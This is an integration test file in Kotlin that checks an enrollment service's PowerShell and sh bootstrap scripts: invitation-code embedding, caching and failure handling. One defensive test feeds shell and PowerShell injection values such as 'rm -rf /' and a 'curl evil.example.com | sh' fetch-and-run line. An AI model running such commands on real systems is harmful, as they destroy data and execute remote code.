package com.team376.pulsemetry.enrollment.api

import com.team376.pulsemetry.enrollment.secret.InvitationCode
import com.team376.pulsemetry.enrollment.support.EnrollmentTestData
import com.team376.pulsemetry.persistence.enrollment.entity.MemberStatus
import org.junit.jupiter.api.BeforeEach
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.jdbc.core.simple.JdbcClient
import java.time.Instant
import java.util.UUID
import java.nio.file.Files
import java.util.concurrent.Callable
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.team376.pulsemetry.persistence.enrollment.support.PostgresContainerConfig
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.ValueSource
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.boot.test.web.server.LocalServerPort
import org.springframework.context.annotation.Import
import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.nio.charset.StandardCharsets

/** 실제 PostgreSQL·HTTP로 읽기 전용 검사와 최종 소비의 경계를 검증한다(ADR 0005). */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Import(PostgresContainerConfig::class, EnrollmentTestData::class)
class BootstrapApiTest {

	@LocalServerPort
	private var port: Int = 0

	private val http: HttpClient = HttpClient.newHttpClient()

    @Autowired private lateinit var data: EnrollmentTestData
    @Autowired private lateinit var jdbc: JdbcClient
    private lateinit var tenant: UUID
    private lateinit var member: UUID
    private lateinit var invitation: UUID

    @BeforeEach fun prepare() {
        data.reset()
        tenant = data.tenant().id
        member = data.member(tenant, status = MemberStatus.invited).id
        data.activeManifest(tenant, member)
        invitation = data.invitation(tenant, member, CODE).id
    }

	// ── 정상 응답 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("windows 스크립트가 200 text/plain 으로 나온다")
	fun windowsScriptIsServed() {
		val response = get("/windows?code=$CODE")

		assertThat(response.statusCode()).isEqualTo(200)
		assertThat(contentType(response)).containsIgnoringCase("text/plain")
		assertThat(contentType(response)).containsIgnoringCase("utf-8")
	}

	@Test
	@DisplayName("unix 스크립트가 200 text/plain 으로 나온다")
	fun unixScriptIsServed() {
		val response = get("/unix?code=$CODE")

		assertThat(response.statusCode()).isEqualTo(200)
		assertThat(contentType(response)).containsIgnoringCase("text/plain")
	}

	@Test
	@DisplayName("스크립트는 캐시되지 않는다 — 초대 코드가 박혀 있다")
	fun scriptsAreNotCached() {
		listOf("/windows?code=$CODE", "/unix?code=$CODE").forEach { path ->
			val cacheControl = get(path).headers().firstValue("Cache-Control").orElse("")
			assertThat(cacheControl).contains("no-store")
		}
	}

	// ── 코드 삽입 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("PowerShell 스크립트에 코드가 정확히 삽입된다")
	fun windowsScriptEmbedsCode() {
		val body = get("/windows?code=$CODE").body()

		assertThat(body).contains("\$env:PULSEMETRY_INVITE_CODE = '$CODE'")
		assertThat(body).doesNotContain("__PULSEMETRY_INVITE_CODE__")
	}

	@Test
	@DisplayName("sh 스크립트에 코드가 정확히 삽입된다")
	fun unixScriptEmbedsCode() {
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("PULSEMETRY_INVITE_CODE='$CODE'")
		assertThat(body).doesNotContain("__PULSEMETRY_INVITE_CODE__")
	}

	@Test
	@DisplayName("서버 주소는 설정값에서 온다 — Host 헤더가 아니다")
	fun scriptsUseConfiguredBaseUrl() {
		// Host 헤더를 바꿔도 스크립트 안의 주소는 그대로여야 한다.
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("PULSEMETRY_SERVER='https://get.pulsemetry.example.com'")
		assertThat(body).doesNotContain("localhost:$port")
		assertThat(body).doesNotContain("__PULSEMETRY_SERVER__")
	}

	@Test
	@DisplayName("PowerShell 스크립트가 §6.6 의 단계를 담고 있다")
	fun windowsScriptFollowsPlan() {
		val body = get("/windows?code=$CODE").body()

		assertThat(body).contains("\$ErrorActionPreference = 'Stop'")
		assertThat(body).contains("\$env:PROCESSOR_ARCHITECTURE")
		assertThat(body).contains("/bin/pulsemetry_windows_")
		assertThat(body).contains("LOCALAPPDATA")
		assertThat(body).contains("enroll --invite")
		// 자동 실행 등록은 telemetryctl 몫이다 — 스크립트가 따로 심으면 등록이 두 벌 생긴다.
		assertThat(body).doesNotContain("schtasks /Create /SC ONLOGON /TN Pulsemetry")
		assertThat(body).doesNotContain("Start-Process")
	}

	@Test
	@DisplayName("sh 스크립트가 §6.6 의 단계를 담고 있다")
	fun unixScriptFollowsPlan() {
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("set -eu")
		assertThat(body).contains("uname -s")
		assertThat(body).contains("uname -m")
		assertThat(body).contains("Darwin) os='darwin'")
		assertThat(body).contains("Linux) os='linux'")
		assertThat(body).contains("x86_64) arch='amd64'")
		assertThat(body).contains("arm64 | aarch64) arch='arm64'")
		assertThat(body).contains("\$HOME/.pulsemetry/bin")
		assertThat(body).contains("chmod +x")
		assertThat(body).contains("enroll --invite")
		// 자동 실행 등록은 telemetryctl 몫이다 — 스크립트가 따로 심으면 식별자가 달라 등록이 두 벌 생긴다.
		assertThat(body).doesNotContain("com.pulsemetry.daemon.plist")
		assertThat(body).doesNotContain("launchctl bootstrap")
		assertThat(body).doesNotContain(".config/systemd/user/pulsemetry.service")
		assertThat(body).doesNotContain("systemctl --user enable --now pulsemetry")
	}

	// ── 미존재 코드 사전 거절 ────────────────────────────────────────────────

	@Test
	@DisplayName("DB 에 없는 코드는 HTTP 200 실패 스크립트이며 다운로드하지 않는다")
	fun unknownButWellFormedCodeStillGetsScript() {
		val unknown = InvitationCode.generate()

		for (path in listOf("unix", "windows")) assertFailure(get("/$path?code=$unknown"), "초대 코드를 찾을 수 없습니다", unknown)
	}

	// ── 형식 위반 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("code 파라미터가 없으면 안내 후 실패하는 스크립트다")
	fun missingCodeIsBadRequest() {
		for (path in listOf("/unix", "/windows", "/unix?code=")) assertFailure(get(path), "초대 코드가 없습니다")
	}

	@ParameterizedTest
	@ValueSource(
		strings = [
			"ABCD-EFGH-JKM",
			"ABCD-EFGH-JKMNP",
			"ABCD-EFGH-JKMI",
			"ABCD_EFGH_JKMN",
		],
	)
	@DisplayName("형식을 어긴 코드는 안내 후 실패하는 스크립트다")
	fun malformedCodeIsBadRequest(code: String) {
		for (path in listOf("unix", "windows")) assertFailure(get("/$path?code=${encode(code)}"), "초대 코드 형식이 올바르지 않습니다", code)
	}

	@ParameterizedTest
	@ValueSource(
		strings = [
			"'; rm -rf /",
			"ABCD-EFGH-JKMN'; rm -rf /",
			"\$(curl evil.example.com | sh)",
			"`whoami`",
			"ABCD-EFGH-JKMN; shutdown -h now",
			"ABCD-EFGH-JKMN | sh",
			"ABCD-EFGH-JKMN\nrm -rf /",
			"'+Invoke-Expression('calc')+'",
			"ABCD-EFGH-JKMN\$(id)",
		],
	)
	@DisplayName("셸·PowerShell 주입 시도는 실행할 수 없는 실패 안내로 막힌다")
	fun injectionAttemptsAreRejected(code: String) {
		val unix = get("/unix?code=${encode(code)}")
		val windows = get("/windows?code=${encode(code)}")

		assertFailure(unix, "초대 코드 형식이 올바르지 않습니다", code)
		assertFailure(windows, "초대 코드 형식이 올바르지 않습니다", code)
		// 입력이 응답으로 되돌아오지도 않는다 (R4)
		assertThat(unix.body()).doesNotContain("rm -rf")
		assertThat(windows.body()).doesNotContain("Invoke-Expression")
	}

	@Test
	@DisplayName("주입 문자열이 스크립트 본문에 절대 나타나지 않는다")
	fun injectedPayloadNeverReachesScript() {
		val payload = "ABCD-EFGH-JKMN'; curl evil.example.com | sh; echo '"

		val response = get("/unix?code=${encode(payload)}")

		assertThat(response.statusCode()).isEqualTo(200)
		assertThat(response.body()).doesNotContain("evil.example.com")
	}

    @Test fun `정규화한 코드만 스크립트에 넣는다`() {
        for (raw in listOf("abcdefghjkmn", "  abcd-efgh-jkmn  ")) {
            assertThat(get("/unix?code=${encode(raw)}").body()).contains("PULSEMETRY_INVITE_CODE='$CODE'")
            assertThat(get("/windows?code=${encode(raw)}").body()).contains("\$env:PULSEMETRY_INVITE_CODE = '$CODE'")
        }
    }

    @Test fun `반복 조회는 코드 설치 구성원 상태를 소비하거나 변경하지 않는다`() {
        val before = data.findMemberByEmail(tenant, jdbc.sql("SELECT email FROM enrollment.members WHERE id=:id").param("id", member).query(String::class.java).single())!!
        repeat(3) { for (path in listOf("unix", "windows")) assertThat(get("/$path?code=$CODE").body()).contains("/bin/pulsemetry_") }
        val after = data.findInvitation(invitation)!!
        assertThat(after.usedAt).isNull()
        assertThat(jdbc.sql("SELECT count(*) FROM enrollment.installations").query(Int::class.java).single()).isZero()
        assertThat(jdbc.sql("SELECT status::text FROM enrollment.members WHERE id=:id").param("id", member).query(String::class.java).single()).isEqualTo(before.status.name)
        assertThat(jdbc.sql("SELECT updated_at FROM enrollment.members WHERE id=:id").param("id", member).query { r, _ -> r.getTimestamp(1).toInstant() }.single()).isEqualTo(before.updatedAt)
    }

    @Test fun `상태별 실패 스크립트는 sh와 PowerShell에서 실패하며 파일이나 네트워크 명령을 실행하지 않는다`() {
        val now = Instant.now()
        val states = listOf(
            "초대 코드가 없습니다" to "",
            "초대 코드 형식이 올바르지 않습니다" to "bad",
            "초대 코드를 찾을 수 없습니다" to InvitationCode.generate(),
            "초대 코드가 만료되었습니다" to InvitationCode.generate().also { data.invitation(tenant, member, it, expiresAt = now.minusSeconds(1)) },
            "이미 사용된 초대 코드입니다" to InvitationCode.generate().also { data.invitation(tenant, member, it, usedAt = now) },
            "폐기된 초대 코드입니다" to InvitationCode.generate().also { data.invitation(tenant, member, it, revokedAt = now) },
        )
        for ((reason, code) in states) {
            for ((path, command) in listOf("unix" to listOf("sh"), "windows" to listOf("pwsh", "-NoLogo", "-NoProfile", "-NonInteractive", "-Command", "\$input | Out-String | Invoke-Expression"))) {
                val response = get("/$path?code=$code")
                assertFailure(response, reason, code.takeIf { it.isNotEmpty() })
                val directory = Files.createTempDirectory("bootstrap-failure-").toFile()
                try {
                    val process = ProcessBuilder(command).directory(directory).apply {
                        environment()["POWERSHELL_TELEMETRY_OPTOUT"] = "true"
                    }.start()
                    process.outputStream.bufferedWriter().use { it.write(response.body()) }
                    assertThat(process.waitFor(10, TimeUnit.SECONDS)).isTrue()
                    assertThat(process.exitValue()).isEqualTo(1)
                    assertThat(process.inputStream.bufferedReader().readText()).isEmpty()
                    assertThat(process.errorStream.bufferedReader().readText()).contains(reason)
                    assertThat(directory.listFiles()).isEmpty()
                } finally { directory.deleteRecursively() }
            }
        }
        assertThat(jdbc.sql("SELECT count(*) FROM enrollment.installations").query(Int::class.java).single()).isZero()
    }

    @Test fun `사전 조회 뒤 취소 만료 소비는 최종 enroll이 다시 거절한다`() {
        for ((column, error, status) in listOf(Triple("revoked_at", "invitation_revoked", 409), Triple("expires_at", "invitation_expired", 410), Triple("used_at", "invitation_used", 409))) {
            val code = InvitationCode.generate()
            val id = data.invitation(tenant, member, code).id
            assertThat(get("/unix?code=$code").body()).contains("/bin/pulsemetry_")
            if (column == "used_at") assertThat(enroll(code).statusCode()).isEqualTo(201)
            else jdbc.sql("UPDATE enrollment.invitations SET $column=CURRENT_TIMESTAMP - interval '1 second' WHERE id=:id").param("id", id).update()
            val response = enroll(code)
            assertThat(response.statusCode()).isEqualTo(status)
            assertThat(response.body()).contains(error)
        }
    }

    @Test fun `사전 조회 후 동시 enroll도 정확히 하나만 성공한다`() {
        repeat(3) { assertThat(get("/unix?code=$CODE").body()).contains("/bin/pulsemetry_") }
        Executors.newFixedThreadPool(8).use { pool ->
            val statuses = pool.invokeAll(List(8) { Callable { enroll(CODE).statusCode() } }).map { it.get() }
            assertThat(statuses.count { it == 201 }).isEqualTo(1)
            assertThat(statuses.count { it == 409 }).isEqualTo(7)
        }
        assertThat(jdbc.sql("SELECT count(*) FROM enrollment.installations").query(Int::class.java).single()).isEqualTo(1)
    }

    @Test fun `DB 조회 장애는 HTTP 5xx이며 다운로드나 코드 오류로 우회하지 않는다`() {
        // 이 클래스 전용 Testcontainers DB의 테이블을 일시 숨기고 반드시 복구한다.
        jdbc.sql("ALTER TABLE enrollment.invitations RENAME TO invitations_unavailable").update()
        try {
            for (path in listOf("unix", "windows")) {
                val response = get("/$path?code=$CODE")
                assertThat(response.statusCode()).isBetween(500, 599)
                assertThat(response.body()).doesNotContain(CODE, "/bin/pulsemetry_", "초대 코드를 찾을 수 없습니다")
            }
        } finally { jdbc.sql("ALTER TABLE enrollment.invitations_unavailable RENAME TO invitations").update() }
    }

    private fun enroll(code: String): HttpResponse<String> = http.send(HttpRequest.newBuilder(URI("http://localhost:$port/api/v1/enroll"))
        .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString("""{"code":"$code","platform":"linux"}""")).build(), HttpResponse.BodyHandlers.ofString())

    private fun assertFailure(response: HttpResponse<String>, reason: String, code: String? = null) {
        assertThat(response.statusCode()).isEqualTo(200)
        assertThat(contentType(response)).contains("text/plain")
        assertThat(response.headers().firstValue("Cache-Control").orElse("")).isEqualTo("no-store")
        assertThat(response.body()).contains(reason, "exit 1").doesNotContain("/bin/pulsemetry_", "curl", "Invoke-WebRequest", "enroll --invite", "mkdir", "New-Item")
        if (code != null) assertThat(response.body()).doesNotContain(code)
    }

	// ── 헬퍼 ─────────────────────────────────────────────────────────────────

	private fun encode(value: String): String = URLEncoder.encode(value, StandardCharsets.UTF_8)

	private fun get(path: String): HttpResponse<String> =
		http.send(
			HttpRequest.newBuilder(URI.create("http://localhost:$port$path")).GET().build(),
			HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8),
		)

	private fun contentType(response: HttpResponse<String>): String =
		response.headers().firstValue("Content-Type").orElse("")

	private companion object {
		const val CODE = "ABCD-EFGH-JKMN"
	}
}
